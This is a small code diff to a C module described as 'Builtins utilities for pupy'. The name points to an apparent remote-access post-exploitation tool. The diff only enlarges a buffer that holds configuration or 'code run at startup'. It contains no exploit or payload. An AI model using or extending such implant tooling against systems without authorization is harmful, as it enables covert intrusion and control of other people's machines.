@@ -11,7 +11,7 @@ static char module_doc[] = "Builtins utilities for pupy";
 
 extern const char resources_library_compressed_string_txt_start[];
 extern const int resources_library_compressed_string_txt_size;
-char pupy_config[4096]="####---PUPY_CONFIG_COMES_HERE---####\n"; //big array to have space for more config / code run at startup
+char pupy_config[40960]="####---PUPY_CONFIG_COMES_HERE---####\n"; //big array to have space for more config / code run at startup
 extern const DWORD dwPupyArch;
 static PyObject *Py_get_compressed_library_string(PyObject *self, PyObject *args)
 {
